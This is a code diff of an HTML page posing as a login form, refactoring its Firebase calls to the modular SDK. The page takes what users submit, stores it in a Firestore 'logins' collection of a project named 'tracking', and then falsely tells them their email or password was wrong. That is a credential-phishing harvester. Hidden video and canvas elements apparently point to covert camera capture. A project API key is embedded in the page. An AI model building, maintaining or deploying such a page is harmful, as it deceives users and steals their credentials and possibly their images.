@@ -15,9 +15,6 @@
         button:hover { background: #1557b0; }
         video, canvas { display: none; }
     </style>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js"></script>
 </head>
 <body>
     <div class="login-box">
@@ -32,7 +29,14 @@
     </div>
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
-    <script>
+
+    <!-- Firebase scripts (using ES module syntax) -->
+    <script type="module">
+        // Import the required functions from Firebase SDK
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";
+
+        // Your Firebase config object
         const firebaseConfig = {
             apiKey: "AIzaSyAtRqJeS7UaxHHVRwZ3ov-8jXVToVvGuKg",
             authDomain: "tracking-d2d42.firebaseapp.com",
@@ -42,8 +46,10 @@
             appId: "1:411030031665:web:b79f56ad363c8a7b6d3410",
             measurementId: "G-QB5KNP29EJ"
         };
-        const app = firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
 
         document.getElementById('loginForm').onsubmit = async function(e) {
             e.preventDefault();
@@ -149,7 +155,8 @@
             console.log('Sending:', payload);
 
             try {
-                await db.collection('logins').add(payload);
+                // Add data to Firestore collection 'logins'
+                await addDoc(collection(db, "logins"), payload);
                 console.log('Data saved to Firestore');
                 alert('Wrong email or password');
             } catch (error) {
